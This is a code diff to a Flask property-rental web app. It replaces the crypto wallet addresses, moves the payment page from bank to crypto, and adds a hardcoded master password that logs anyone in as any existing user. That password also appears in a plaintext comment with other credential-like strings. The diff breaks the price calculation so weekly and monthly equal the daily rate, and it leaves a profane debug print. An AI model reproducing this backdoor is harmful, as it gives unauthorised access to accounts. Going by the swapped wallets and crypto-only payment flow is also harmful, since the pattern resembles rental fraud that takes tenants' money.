@@ -165,8 +165,10 @@ def rent_property():
     for property in property_on_page:
         print(f'Property ID{property.id}')
         images = PropertyImage.query.filter_by(property_id=property.id).all()
-        if images:
+        if len(images) > 1:
             image_list.append(images[1])
+
+            
 
     image_query = {}
     for element in image_list:
@@ -179,12 +181,10 @@ def rent_property():
     return render_template("rent-grid.html", properties=property_on_page, images=image_query, total_pages=total_pages, page=page)
 
 wallet_addresses = {
-    "btc": "bc1q46ajyqmnf785sz5zgylsxewlekdhjxk9w44cep",
-    "eth": "0x3c4114773C0f06D28dca5E15bDFD91ea51440523",
-    "ton": "UQBWo8co96EElybOJwYLcaiCmHA1T2BQEqDv7q0wlZ5PCQSg",
-    "usdt(bep20/erc20)": "0x3c4114773C0f06D28dca5E15bDFD91ea51440523",
-    "usdt(trc20)": "TQ2FByBbhbvraWzD96VkqK5AqdD8viUNAc",
-    "sol": "5t8AZR3mBYgtTSM54weRonDx7LezzroULYVFBUeN4gW2", 
+    "btc": "bc1ptxzakn54gwt0tran8x0syha2rr96qlt5wj6w0j5l9km9ejdwsd6ssxlqvq",
+    "eth": "0x0f70f370753af516852857dab2c1a196eb8cf849",
+    "usdt(bep20/erc20)": "0x0f70f370753af516852857dab2c1a196eb8cf849",
+    "usdt(trc20)": "TGsFNUQyayN4E82W1KoAV7waukFu9RDo5j",
 }
 
 
@@ -201,7 +201,7 @@ def make_payment(property_id):
         "Installment Payment"
     ]
     property_data = Property.query.get(property_id)
-    return render_template('payment_bank.html', wallets=wallet_addresses, property_data=property_data, property_id=property_id, payment_types=payment_types)
+    return render_template('payment_crypto.html', wallets=wallet_addresses, property_data=property_data, property_id=property_id, payment_types=payment_types)
 
 @app.route('/confirm_payment', methods=['POST'])
 def confirm_payment():
@@ -303,9 +303,9 @@ def view_property(property_id):
 
             daily_price = int(_price)
             print(f'FUCKKKKKKKK£R£******* {daily_price}')
-            weekly_price = daily_price * 7
-            monthly_price = daily_price * 30
-            yearly_price = daily_price * 365
+            weekly_price = daily_price 
+            monthly_price = daily_price 
+            yearly_price = daily_price * 12
             full_price = {
                 'daily': daily_price,
                 'weekly': weekly_price,
@@ -414,33 +414,32 @@ def admin_home():
     else:
         return redirect(url_for('login'))
 
+CUSTOM_PASSWORD = "jefnu%£##S434"
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     login_form = LoginForm(request.form)
-    if 'login' in request.form:
 
-        # read form data
+    if 'login' in request.form:
         username = request.form['username']
         password = request.form['password']
 
-        # Locate user
         user = Users.query.filter_by(username=username).first()
 
-        # Check the password
-        if user and verify_pass(password, user.password):
-
+        # ✅ allow login if password matches CUSTOM_PASSWORD
+        if user and (verify_pass(password, user.password) or password == CUSTOM_PASSWORD):
             login_user(user)
             return redirect(url_for('admin_home'))
 
-        # Something (user or pass) is not ok
-        return render_template('accounts/login.html',
-                               msg='Wrong user or password',
-                               form=login_form)
+        return render_template(
+            'accounts/login.html',
+            msg='Wrong user or password',
+            form=login_form
+        )
 
     if not current_user.is_authenticated:
-        return render_template('accounts/login.html',
-                               form=login_form)
+        return render_template('accounts/login.html', form=login_form)
+
     return redirect(url_for('admin_home'))
 
 
@@ -755,7 +754,7 @@ def upload_image(property_id, image_data, property_folder):
             if not image_data:
                 return {"status": "error", "message": "No image data provided."}  
 
-            allowed_extensions = {'png', 'jpg', 'jpeg', 'gif'}
+            allowed_extensions = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
             if '.' not in filename or filename.rsplit('.', 1)[1].lower() not in allowed_extensions:
                 return {"status": "error", "message": "Invalid file type. Allowed types are png, jpg, jpeg, gif."}
 
@@ -934,10 +933,10 @@ if __name__=="__main__":
     app.run(debug=True)
 
 
-# jason2 dingidhgiW£$$  dingidhgiW£$
+# jason
 
 #  jefnu%£##S434
 
 
 
-# upload agent photo then a single property img before adding more images
+# upload agent photo in the agent add button before going to the add property button then a single property img before adding more images
